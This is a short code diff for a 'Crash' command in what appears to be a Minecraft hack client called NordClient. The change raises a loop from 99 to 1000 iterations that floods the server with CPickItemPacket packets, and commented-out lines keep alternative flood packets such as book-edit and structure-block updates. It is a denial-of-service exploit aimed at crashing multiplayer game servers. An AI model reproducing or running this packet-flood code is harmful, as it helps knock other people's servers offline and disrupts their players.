@@ -1,9 +1,7 @@
 package io.ace.nordclient.command.commands;
 
 import io.ace.nordclient.command.Command;
-import io.ace.nordclient.managers.HackManager;
-import net.minecraft.network.play.client.*;
-import net.minecraft.world.Difficulty;
+import net.minecraft.network.play.client.CPickItemPacket;
 
 public class Crash extends Command {
     @Override
@@ -18,7 +16,7 @@ public class Crash extends Command {
 
     @Override
     public void onClientCommand(String command, String[] args) throws Exception {
-        for (int i = 0; i < 99; i++) {
+        for (int i = 0; i < 1000; i++) {
             //needbook//mc.player.connection.sendPacket(new CEditBookPacket(mc.player.getHeldItemMainhand(), true, 100));
             //mc.player.connection.sendPacket(new CUpdateStructureBlockPacket());
             mc.player.connection.sendPacket(new CPickItemPacket(10));
